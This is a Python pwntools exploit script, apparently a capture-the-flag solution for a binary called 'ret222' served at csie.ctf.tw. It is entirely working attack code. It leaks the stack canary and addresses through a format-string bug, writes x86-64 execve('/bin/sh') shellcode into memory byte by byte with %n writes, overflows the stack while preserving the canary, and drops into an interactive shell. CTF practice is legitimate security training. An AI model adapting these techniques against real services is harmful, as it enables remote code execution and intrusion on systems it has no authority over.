from pwn import *
import time
#context.log_level="error"
#r = process(["./ret222"])
r = remote("csie.ctf.tw",10122)
r.recvuntil('>', drop=False)
data = [0 for i in range(1,11) ]
for i in range(11,30):
	r.send("0"*14+"1")
	r.recvuntil(":", drop=True)
	r.send("%{}$p".format(i)+" "*11)
	r.recvuntil('>', drop=True)
	r.send("0"*14+"2")
	data.append(r.recvuntil('>', drop=False).split(':')[1].split()[0])
	#print i,data[i-1]

shellcode = \
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"+\
"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"+\
"\x54\x5f\x99\x52\x57\x54\x5e\xb0"+\
"\x3b\x0f\x05"

shellcode = shellcode + "A"*(10-(len(shellcode)%10))
code_len = len(shellcode)
main = int(data[23],16) - 0x140
address = main + 243
name = int(data[23],16)+0x2012e0
code_place = name & (~0xfff)
code_place += 0x50
#print "%x"% (code_place+0xfff)
cookie = int(data[22],16)
#stack_place =  int(data[0],16)+ 0x2690
r.send("0"*14+"3")
r.recvuntil(":", drop=True)
r.send("A"*136+p64(cookie)+p64(main)*10+"AAAAAAAA\n")
r.recvuntil(">", drop=True)
r.send("0"*14+"4")
r.recvuntil(">", drop=True)


shellcode = list(shellcode)


for i in range(0,code_len,10):

	r.send("0"*14+"3")
	r.recvuntil(":", drop=True)
	address_list =""
	for j in range(10):
		address_list += p64(code_place+i+j)
	r.send(address_list+"\n")
	r.recvuntil(">", drop=True)
	for j in range(10):
		r.send("0"*14+"1")
		r.recvuntil(":", drop=True)
		r.send("%{}c%{}$n".format(ord(shellcode[i+j]),6+j)+" "*8+"\n")
		r.recvuntil(">", drop=True)
		r.send("0"*14+"2")
		r.recvuntil(">", drop=True)


r.send("0"*14+"3")
r.recvuntil(":", drop=True)
r.send("A"*136+p64(cookie)+p64(code_place)*10+"AAAAAAAA\n")
r.recvuntil(">", drop=True)
r.send("0"*14+"4")
r.recvuntil("> ", drop=True)
r.interactive()

